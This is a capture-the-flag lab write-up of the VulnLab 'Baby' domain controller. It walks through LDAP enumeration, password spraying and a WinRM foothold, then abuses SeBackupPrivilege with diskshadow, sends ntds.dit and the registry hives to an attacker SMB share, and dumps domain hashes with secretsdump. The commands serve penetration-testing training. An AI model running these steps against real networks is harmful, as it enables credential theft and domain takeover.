---
layout: post
title: "VulnLab: Baby"
date: 2024-06-29 07:00 -0500
categories:
  - writeups
  - vulnlab
tags:
  - ldap
  - backup
  - secretsdump
image: /images/vulnlab_baby/baby.png
---
## TL;DR

Baby is an **EASY** difficulty machine on [VulnLab](https://wiki.vulnlab.com/guidance/easy/baby). This machine involved performing LDAP enumeration to identify valid domain users and locate a plaintext password in one of the user description fields. By spraying that password across all the identified users, we find one that requires a password change, which once complete gives us an initial shell on the box. Once on the box, we discover that the current user has backup privileges, which allow us to create a copy of the drive and extract the NTDS.dit. That, along with the SAM and SYSTEM hives, allow us to dump all domain credentials with `secretsdump.py`. 

## Enumeration

### Nmap

```console
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-21 11:52:19Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-20T11:21:52
| Not valid after:  2024-12-20T11:21:52
| MD5:   1553:8e6f:d6f7:6a63:9c3e:fb81:d241:adb2
| SHA-1: bc71:79c1:6c0c:ae2b:00f6:ec7f:7b4e:8dbf:31a0:c22e
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQFcXuQwk5Mr5Iro4L87Y/gjANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA2MjAxMTIxNTJaFw0yNDEy
| MjAxMTIxNTJaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuquv0xygIC6VYkeMb0xvhqlKSP4NuWZgS1rw
| vohVW8/SdsUY2CLaXpR7csnkVI3nNvxYOv35qm/LfrUrMvbbT5YCPo5jqy6tp9Df
| 5+EwK3vnY3fdY3GaXEDifkp1J132+ZGM+SQx1paCj5uTsXYrlCLSO6EFvqCB+mfU
| vRD8FPmbY+FA2Cd7gSK2J6gF854PiOwMIUT9HRy+0J2xVzAKTAMxgF5w+9YMucvN
| SLFmWVqQZcRFk0yVWwtbVxv/OT4Lsz3uyWmZFV+5d+8zd1S+W+BqeremGsW47xWP
| kZQRBaXMtyggG4ymVT2jZDkGroSBi10OeGsGTrsrY6xEstAQ3QIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAD4PWAN6BB8rb1EBve9LNkXUWHSb0m4u2LYjGVfSXI4aeXULELMTpX8Kf1Oy
| 5+Voaij0stmH+pcYfhzcnZz6cSYbhk2JRphfyRVmtppHAK5jKrk5ut4lr4XiWItp
| qOqZcKzcWfThp92LRwx+2dx8YEXBzLQVnAAcbXe7VbM3qJHHu/RChQHYb9+u0Czr
| 8ut/5n9XPPOLO3FLVmJ7EHjWwFTAS+a6wPPqFdzKtR2DJ3T7DhwXVmqG5AGY+JFS
| ShFRSOmEc1joekHyNYuwfPNQk/TCdKyFt76N6tMcq70CRpDNaSOCp3r5cvSY2BH+
| 2X2UcOYxSOiC0YEv8SxBCirWoJA=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-21T11:53:09+00:00
|_ssl-date: 2024-06-21T11:53:49+00:00; 0s from scanner time.
5357/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56612/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64285/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### Service footprinting

#### LDAP Enumeration

Initial checks didn't return anything for me, but once I added the base naming context, I got some results. 


```console
〉ldapsearch -x -H ldap://$ip -b "DC=baby,DC=vl"                     
# extended LDIF  
#  
# LDAPv3  
# base <DC=baby,DC=vl> with scope subtree  
# filter: (objectclass=*)  
# requesting: ALL  
#  
  
# baby.vl  
dn: DC=baby,DC=vl  
  
# Administrator, Users, baby.vl  
dn: CN=Administrator,CN=Users,DC=baby,DC=vl  
  
[...SNIP...]
  
# Teresa Bell, it, baby.vl  
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: Teresa Bell  
sn: Bell  
description: Set initial password to BabyStart123!  
givenName: Teresa  
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl  
instanceType: 4  
whenCreated: 20211121151108.0Z  
whenChanged: 20211121151437.0Z  
displayName: Teresa Bell  
uSNCreated: 12889  
memberOf: CN=it,CN=Users,DC=baby,DC=vl  
uSNChanged: 12905  
name: Teresa Bell  
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==  
userAccountControl: 66080  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 0  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 132819812778759642  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: Teresa.Bell  
sAMAccountType: 805306368  
userPrincipalName: Teresa.Bell@baby.vl  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl  
dSCorePropagationData: 20211121163014.0Z  
dSCorePropagationData: 20211121162927.0Z  
dSCorePropagationData: 16010101000416.0Z  
msDS-SupportedEncryptionTypes: 0  
  
[...SNIP...]
```

Note the description field for the `Teresa.Bell` user.

```console
description: Set initial password to BabyStart123!
```

We can get a full list of users with the following command:

```console
〉ldapsearch -x -H ldap://$ip -b "DC=baby,DC=vl" "users" | grep dn  
dn: DC=baby,DC=vl  
dn: CN=Administrator,CN=Users,DC=baby,DC=vl  
dn: CN=Guest,CN=Users,DC=baby,DC=vl  
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl  
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl  
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl  
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl  
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  
dn: CN=dev,CN=Users,DC=baby,DC=vl  
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl  
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  
dn: CN=it,CN=Users,DC=baby,DC=vl  
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
```

Getting rid of all the groups we get the following list. 

```console
〉cat users.txt  
administrator  
guest  
jacqueline.barnett  
ashley.webb  
hugh.george  
leonard.dyer  
ian.walker  
connor.wilkinson  
caroline.robinson  
joseph.hughes  
kerry.wilson  
teresa.bell
```

## Foothold

Now we can use `netexec` to spray the previously discovered password against the list of domain users. 

```console
〉nxc smb $ip -u users.txt -p 'BabyStart123!'  
SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  
BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\administrator:BabyStart123! STATUS_L  
OGON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\guest:BabyStart123! STATUS_LOGON_FAI  
LURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STA  
TUS_LOGON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOG  
ON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOG  
ON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LO  
GON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ian.walker:BabyStart123! STATUS_LOGO  
N_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATU  
S_LOGON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  
US_PASSWORD_MUST_CHANGE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_L  
OGON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LO  
GON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOG  
ON_FAILURE  
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE
```

Note that we need to change caroline robinson's password. 

```console
SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  
US_PASSWORD_MUST_CHANGE
```

We can change it with `smbpasswd`. 

```console
〉smbpasswd -r $ip -U BABY.vl/caroline.robinson  
Old SMB password:  
New SMB password:  
Retype new SMB password:  
Password changed for user caroline.robinson
```

Once the password is changed, we can confirm it with `netexec`. 

```console
〉nxc smb $ip -u caroline.robinson -p 'P@ssw0rd123!'  
SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  
BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  
SMB         10.10.65.95     445    BABYDC           [+] baby.vl\caroline.robinson:P@ssw0rd123!
```

Perfect! Now that we have a valid credential for the `caroline.robinson` user, we can log into the machine with `evil-winrm`. 

```console
〉evil-winrm -i $ip -u 'caroline.robinson' -p 'P@ssw0rd123!'  
                                          
Evil-WinRM shell v3.5  
                                          
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() functi  
on is unimplemented on this machine  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remot  
e-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

Grab the user flag and start enumerating. 

## Privilege Escalation

Checking our current privileges, we find that `caroline.robinson` has the `SeBackupPrivilege` enabled. With this privilege enabled, the user can bypass file and directory restrictions for the purpose of backing them up. This privilege causes the system to grant all read access to any file, regardless of the access control list specified for the file. 

[4672(S) Special privileges assigned to new logon. - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672)


```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name              SID  
====================== ==============================================  
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID                                       
      Attributes  
========================================== ================ ========================================  
====== ==================================================  
Everyone                                   Well-known group S-1-1-0                                   
      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                              
      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                              Alias            S-1-5-32-545                              
      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                              
      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                              
      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                   
      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                  
      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                  
      Mandatory group, Enabled by default, Enabled group  
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-144464765  
4-1109 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                               
      Mandatory group, Enabled by default, Enabled group  
Mandatory Label\High Mandatory Level       Label            S-1-16-12288  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
SeShutdownPrivilege           Shut down the system           Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.
```

Note the SeBackupPrivilege. We can abuse this using the method here: 

[Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)

I added the "X" to the end of each line because I found that the last character was getting stripped off in the next step.

```console
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% F:X
end backupX
```

Then I uploaded that to the `C:\Windows\Tasks` directory and executed it with:

```console
diskshadow /s script.txt
```

After running the script with diskshadow, we can see that we've successfully backed up the `C:\` drive.

```console
*Evil-WinRM* PS C:\Windows\Tasks> diskshadow /s script.txt  
Microsoft DiskShadow version 1.0  
Copyright (C) 2013 Microsoft Corporation  
On computer:  BABYDC,  6/21/2024 12:37:10 PM  
  
-> set metadata C:\Windows\Temp\meta.cab  
-> set context clientaccessible  
-> set context persistent  
-> begin backup  
-> add volume C: alias cdrive  
-> create  
Alias cdrive for shadow ID {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} set as environment variable.  
Alias VSS_SHADOW_SET for shadow set ID {ed611205-454f-4713-9c5c-c41e3ca812e0} set as environment variable.  
  
Querying all shadow copies with the shadow copy set ID {ed611205-454f-4713-9c5c-c41e3ca812e0}  
  
       * Shadow copy ID = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}               %cdrive%  
               - Shadow copy set: {ed611205-454f-4713-9c5c-c41e3ca812e0}       %VSS_SHADOW_SET%  
               - Original count of shadow copies = 1  
               - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]  
               - Creation time: 6/21/2024 12:37:29 PM  
               - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  
               - Originating machine: BabyDC.baby.vl  
               - Service machine: BabyDC.baby.vl  
               - Not exposed  
               - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}  
               - Attributes:  No_Auto_Release Persistent Differential  
  
Number of shadow copies listed: 1  
-> expose %cdrive% F:  
-> %cdrive% = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}  
The shadow copy was successfully exposed as F:\.  
-> end backup  
->
```

Once that's done, we can make a copy of the ntds.dit file using:

```console
robocopy /B F:\Windows\NTDS . ntds.dit
```

Once that's copied, we can transfer it back over to the attacker machine. I set up an SMB server using `smbserver.py` for the transfer. 

On the target computer:

```console
net use \\attacker-address\share /user:<USER> <PASSWORD>
```

```console
*Evil-WinRM* PS C:\Windows\Tasks> copy ntds.dit \\10.8.2.86\pwnshare\ntds.dit
```

After we have the ntds.dit file copied over to our attacker machine, we need to grab the SAM and SYSTEM hives as well. 

```console
*Evil-WinRM* PS C:\Windows\Tasks> reg save HKLM\sam \\10.8.2.86\pwnshare\sam.sav
The operation completed successfully.
```

```console
*Evil-WinRM* PS C:\Windows\Tasks> reg save HKLM\system \\10.8.2.86\pwnshare\system.sav
The operation completed successfully.
```

Now that we have all these files on our attacker machine, we can run `secretsdump.py` to extract all the stored credentials.

```console
〉secretsdump.py -sam sam.sav -system system.sav -ntds ntds.dit LOCAL  
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra  
  
[...SNIP...]

[*] Reading and decrypting hashes from ntds.dit    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::  

[...SNIP...]
```

Now that we have all the stored credentials, we can just grab the domain admin's NT hash and log in to get the final flag. 

```console
〉nxc smb $ip -u 'Administrator' -H '[REDACTED]'  
SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (sig  
ning:True) (SMBv1:False)  
SMB         10.10.65.95     445    BABYDC           [+] baby.vl\Administrator:[REDACTED] (Pwn3d!)
```

